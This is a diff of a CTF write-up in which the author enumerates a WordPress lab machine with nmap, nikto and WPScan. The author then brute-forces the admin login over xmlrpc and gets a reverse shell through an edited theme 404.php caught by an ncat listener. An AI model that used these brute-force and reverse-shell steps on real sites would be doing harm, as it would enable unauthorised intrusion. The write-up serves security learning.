@@ -17,11 +17,8 @@ Hello fellow IT security enthusiasts! Today, I'm going to walk you through my pr
 The first step in any CTF challenge is reconnaissance. For this, I used `nmap`, a powerful open-source tool for network exploration and security auditing.
 
 ```bash
-sudo nmap 10.10.1.157 -p0-
+sudo nmap [target IP] -p0-
 
-Nmap scan report for 10.10.1.157
-Host is up (0.051s latency).
-Not shown: 65533 filtered tcp ports (no-response)
 PORT    STATE  SERVICE
 22/tcp  closed ssh
 80/tcp  open   http
@@ -33,10 +30,8 @@ This basic nmap scan over all ports revealed that the SSH port was closed, but p
 To gather more information, I ran a comprehensive nmap scan over the found ports:
 
 ```bash
-sudo nmap 10.10.1.157 -p22,80,443 -sV -A
+sudo nmap [target IP] -p22,80,443 -sV -A
 
-Nmap scan report for 10.10.1.157
-Host is up (0.054s latency).
 
 PORT    STATE  SERVICE  VERSION
 22/tcp  closed ssh
@@ -52,7 +47,7 @@ PORT    STATE  SERVICE  VERSION
 Device type: general purpose|specialized|storage-misc|WAP|printer
 Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (88%), Crestron 2-Series (87%), HP embedded (87%), Asus embedded (86%)
 OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
-Aggressive OS guesses: Linux 3.10 - 3.13 (88%), Linux 3.10 - 4.11 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.8 (88%), Linux 5.4 (88%), Linux 3.16 (87%), Linux 3.2 - 3.5 (87%), Linux 4.2 (87%), Linux 4.4 (87%)
+Aggressive OS guesses: Linux 3.10 - 3.13 (88%) [..]
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
 
@@ -69,11 +64,10 @@ The scan confirmed that we have a web server running, serving an interactive web
 To dig deeper, I used `nikto`, another open-source web server scanner which performs comprehensive tests against web servers for multiple items, including potentially dangerous files and CGIs. Upon further investigation with `nikto`, I discovered an interesting `robots.txt` file and learned that the web server was serving a WordPress blog.
 
 ```bash
-nikto -host http://10.10.1.157                                                                               [...]
-
+nikto -host http://[target IP]
+[...]
 + Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
-+ Uncommon header 'tcn' found, with contents: list
-+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+[...]
 + OSVDB-3092: /admin/: This might be interesting...
 + OSVDB-3092: /readme: This might be interesting...
 + Uncommon header 'link' found, with contents: <http://10.10.1.157/?p=23>; rel=shortlink
@@ -101,25 +95,8 @@ In addition to `nikto`, I also used `feroxbuster` to see if there were any hidde
 To enumerate the WordPress instance, I used `WPScan`, a free and open-source black box WordPress vulnerability scanner.
 
 ```bash
-wpscan --url http://10.10.1.157 --enumerate --api-token XXXXXX
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+wpscan --url http://[target IP] --enumerate --api-token XXXXXX
 
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.25
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[+] URL: http://10.10.1.157/ [10.10.1.157]
-[+] Started: Tue Nov  7 14:35:23 2023
-
-Interesting Finding(s):
 
 [...]
 
@@ -183,7 +160,7 @@ The `WPScan` revealed some interesting findings: 110 vulnerabilities, the direct
 Despite not finding a user, I decided to run the `WPScan` with the user `admin`, because why not? It's always worth trying the obvious!
 
 ```bash
-wpscan --password-attack xmlrpc -t 20 -U admin -P ~/Downloads/xxxxxx.dic --url http://10.10.1.157
+wpscan --password-attack xmlrpc -t 20 -U admin -P ~/Downloads/xxxxxx.dic --url http://[target IP]
 ```
 
 The dictionary was huge, and I wasted at least half an hour before I realized that there were duplicates in the dictionary. I removed the duplicates with awk, which reduced the size to about 12%.
@@ -202,7 +179,7 @@ On my local machine, I started netcat to listen on the port I configured the rev
 ncat -lvp 6666
 ```
 
-Then I called the 404.php page `http://10.10.1.157/wp-content/themes/twentyfifteen/404.php`.
+Then I called the 404.php page `http://[target IP]/wp-content/themes/twentyfifteen/404.php`.
 
 Netcat got the connection, and I had access to the machine with the user daemon.
 
